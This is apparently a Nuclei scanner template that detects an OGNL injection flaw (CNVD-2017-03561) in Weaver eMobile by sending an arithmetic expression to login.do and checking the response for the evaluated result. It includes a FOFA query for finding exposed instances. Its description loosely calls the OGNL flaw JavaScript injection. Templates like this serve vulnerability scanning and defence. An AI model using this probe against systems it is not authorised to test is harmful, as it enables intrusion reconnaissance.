id: CNVD-2017-03561

info:
  name: 泛微(Weaver) eMobile - OGNL注入漏洞
  author: wintry
  severity: high
  description: |
    泛微 eMobile 移动办公平台存在OGNL注入漏洞.
    攻击者可以注入任意JavaScript,从而可能从数据库获取敏感信息,修改数据,并在受影响站点的上下文中执行未经授权的管理操作.
  metadata:
    max-request: 2
    verified: true
    fofa-query: app="泛微-eMobile"
  tags: emobile

variables:
  num1: "{{rand_int(800000, 999999)}}"
  num2: "{{rand_int(800000, 999999)}}"
  result: "{{to_number(num1)*to_number(num2)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/login.do?message={{num1}}*{{num2}}"
      - "{{BaseURL}}/login/login.do?message={{num1}}*{{num2}}"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{result}}"

      - type: status
        status:
          - 200
